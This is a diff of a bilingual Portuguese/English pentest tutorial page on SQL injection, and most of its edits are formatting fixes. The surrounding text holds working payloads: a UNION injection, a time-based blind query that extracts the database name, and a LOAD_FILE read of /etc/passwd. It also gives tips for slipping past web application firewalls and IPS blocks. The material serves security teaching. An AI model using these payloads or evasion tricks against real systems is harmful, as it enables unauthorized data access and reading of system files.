@@ -47,7 +47,7 @@ A consulta final ficará assim, sendo completamente correta e com isso retorna a
 SELECT * FROM products WHERE name like '%' or 1=1 union select 1, 2, 3, 4, 5, 6; #%'
 ```
 
-<figure><img src="../.gitbook/assets/error-based-sqli-3 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
 
 Agora que conseguimos descobrir corretamente a quantidade de colunas e fazer a consulta funcionar como queríamos, podemos tirar vantagem disso para buscar informações do banco de dados, podemos usar funções do MySQL (banco de dados utilizado) como `user()`, `database()`, `version()` entre outras.
 
@@ -100,11 +100,12 @@ We can also extract the table name from `information_schema`:
 We can take a look at the database to see what the query it will look like:
 
 <figure><img src="../.gitbook/assets/error-based-sqli-10.png" alt=""><figcaption></figcaption></figure>
-## SQL Injection Time Based Blind
+
+\## SQL Injection Time Based Blind
 
 Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used. To exploit it we can use `substring` function to test each character and check it that query returns true (it will wait for 3 seconds), if true, we can confirm the first character and we will do with the next one and so on.
 
- ```
+```
 ' or 1=1 union select 1, 2, if(substring((select database()), 1, 1)="l", sleep(3), NULL), 4, 5, 6; #
 
 ' or 1=1 union select 1, 2, if(substring((select database()), 2, 1)="a", sleep(3), NULL), 4, 5, 6; #
@@ -126,12 +127,11 @@ Quando encontramos uma falha de SQL Injection, também conseguimos gravar uma we
 ' or 1=1 union select 1, 2, LOAD_FILE('/etc/passwd'), 4, 5, 6; #
 ```
 
-
 ## Bypass methods
 
 ### Unicode
 
-Use Unicode to encode the payload (if the application is using JSON to encode data). The following example shows how it works: 
+Use Unicode to encode the payload (if the application is using JSON to encode data). The following example shows how it works:
 
 ```
 <?php
@@ -156,6 +156,7 @@ We can encode our payload, for example, `' union select 1,2, database(), 4, 5, 6
 ```
 
 Some WAFs may block when we use `union select` or something similar, so by using Unicode we can bypass that filter.
+
 ### User-Agent
 
 When we use a tool like sqlmap, by default it uses its own user-agent. It's important to change this because there are WAF/IPS that block user-agent used by these tools.
